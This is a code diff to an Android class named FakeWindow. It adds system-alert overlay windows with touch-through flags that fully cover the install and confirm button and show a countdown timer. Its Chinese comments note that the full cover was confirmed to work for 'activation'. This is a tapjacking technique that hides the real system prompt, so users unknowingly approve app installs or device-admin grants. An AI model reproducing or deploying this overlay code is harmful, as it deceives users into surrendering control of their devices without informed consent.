@@ -32,7 +32,7 @@ public class FakeWindow {
     private View installView;
     private Context context;
     private WindowManager wm;
-    private int count = 5;
+    private int count = 15;
     private Handler handler;
 
     private WindowListener mWindowListener;
@@ -111,22 +111,39 @@ public class FakeWindow {
         float density = dm.density;
 
         //install
+        /***
+         * 只遮盖文字区域
+         */
+//        WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+//        confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+//        confirmBtnParams.format = PixelFormat.RGBA_8888;
+//        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+//        confirmBtnParams.width = (int) (60 * density);
+//        confirmBtnParams.height = (int) (48 * density);
+//        confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (20 * density);
+//        confirmBtnParams.y = screenHeight - (int) (48 * density);
+
+        /**
+         * 测试代码，确认按键全遮盖
+         * 经确认可以支持激活的全遮盖
+         */
         WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
-        confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+        confirmBtnParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
         confirmBtnParams.format = PixelFormat.RGBA_8888;
-        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-        confirmBtnParams.width = (int) (60 * density);
+//        confirmBtnParams.format = PixelFormat.TRANSLUCENT;
+        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+        confirmBtnParams.width = screenWidth / 2;
         confirmBtnParams.height = (int) (48 * density);
-        confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (20 * density);
-//            confirmBtnParams.x = screenWidth / 2 ;
-        confirmBtnParams.y = screenHeight - (int) (48 * density);
+        confirmBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+
         wm.addView(installView, confirmBtnParams);
 
         //timer
         WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
         btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
         btnParams.format = PixelFormat.RGBA_8888;
-        btnParams.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+//        btnParams.format = PixelFormat.TRANSLUCENT;
+        btnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
         btnParams.width = screenWidth / 2;
         btnParams.height = (int) (48 * density);
         btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
